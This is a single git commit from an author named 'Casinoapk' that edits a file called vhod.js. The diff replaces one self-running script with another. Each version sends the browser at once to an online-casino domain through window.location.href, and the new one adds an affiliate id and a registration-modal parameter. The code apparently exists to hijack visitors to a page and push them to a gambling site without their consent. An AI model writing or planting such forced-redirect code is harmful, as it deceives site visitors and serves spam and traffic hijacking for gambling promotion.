1d745757b384be6f0aa3ae0d2c98facbaa4d9101
Casinoapk <stelelena7@gmail.com>
2026-01-13 03:14:55 +0300

    Update vhod.js

--- vhod.js
+++ vhod.js
@@ -1,1 +1,1 @@
-function executeRun(){window.location.href="https://send5.vodka?id=8091"}executeRun();
+function executeRun(){window.location.href="https://vodka.bet/?id=15031&modal=reg"}executeRun();
